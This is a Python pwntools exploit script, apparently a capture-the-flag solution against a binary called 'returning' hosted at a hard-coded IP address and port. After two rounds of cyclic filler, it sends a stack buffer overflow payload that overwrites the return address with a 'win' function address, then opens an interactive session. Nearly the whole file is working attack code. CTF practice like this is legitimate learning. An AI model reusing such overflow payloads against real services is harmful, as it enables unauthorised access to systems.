#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.72.218.129 --port 2222
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './returning'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.72.218.129'
port = int(args.PORT or 2222)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x400a8c
b *0x400a96
b *0x4009ff
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

win = 0x0400921
something = cyclic(20)

io = start()

print(io.recvuntil(b'(y/n)'))

io.send(b'y\n')

print(io.recvuntil(b'something...'))

print(something)
io.send(something)

print(io.recvuntil(b'(y/n)'))

io.send(b'y\n')

print(io.recvuntil(b'something...'))

print(something)
io.send(something)

print(io.recvuntil(b'(y/n)'))

io.send(b'y\n')

print(io.recvuntil(b'words?'))

payload = cyclic(24)
payload += p64(0x0400921)

io.send(payload)

io.interactive()